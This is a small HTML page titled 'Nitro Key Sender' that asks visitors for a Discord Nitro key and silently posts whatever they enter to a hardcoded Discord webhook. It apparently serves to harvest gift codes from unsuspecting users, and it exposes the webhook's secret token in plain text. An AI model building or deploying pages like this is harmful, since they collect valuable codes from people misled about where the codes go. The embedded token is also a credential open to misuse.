<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nitro Key Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      width: 300px;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    h1 {
      color: #333;
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 4px;
      text-align: center;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4a008f; /* Purple color */
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3c006f; /* Slightly darker purple on hover */
    }
  </style>
  <script>
    function sendNitroKey() {
      const nitroKey = document.getElementById("nitroKey").value;

      if (!nitroKey) {
        alert("Please enter a Nitro Key.");
        return;
      }

      const payload = {
        content: `Nitro Key Entered: ${nitroKey}`
      };

      const webhookUrl = 'https://discord.com/api/webhooks/1311057682022797434/om54aFEYSM4VYlmMXh1VsipdCTZk4Ka-6FMWoiDGizrzscc1_D5pY8H34re_AYKKjb43';

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          alert('Nitro Key sent successfully!');
          document.getElementById("nitroKey").value = "";
        } else {
          alert('Failed to send Nitro Key.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while sending the Nitro Key.');
      });
    }
  </script>
</head>
<body>
  <div class="container">
    <h1>Nitro Key Sender</h1>
    <input type="text" id="nitroKey" placeholder="Enter Nitro Key" />
    <button onclick="sendNitroKey()">Send Nitro Key</button>
  </div>
</body>
</html>
